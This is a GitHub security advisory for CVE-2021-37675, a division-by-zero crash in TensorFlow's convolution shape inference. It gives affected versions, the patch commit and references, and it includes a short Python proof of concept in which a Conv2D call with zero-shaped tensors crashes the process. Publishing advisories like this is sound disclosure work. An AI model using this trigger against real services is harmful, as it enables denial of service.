# [M] Division by 0 in most convolution operators

## Summary
Severity: Medium
Advisory: GHSA-9c8h-2mv3-49ww
CVE: CVE-2021-37675
CWE: CWE-369
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-9c8h-2mv3-49ww
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
Most implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:

```python
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Conv2D(
  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  strides = [1, 1, 1, 1],
  padding = "SAME")
```

The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/framework/common_shape_fns.cc#L577) is missing several validations before doing divisions and modulo operations.

### Patches
We have patched the issue in GitHub commit [8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4](https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-2mv3-49ww
- https://nvd.nist.gov/vuln/detail/CVE-2021-37675
- https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-588.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-786.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-297.yaml
- https://github.com/tensorflow/tensorflow
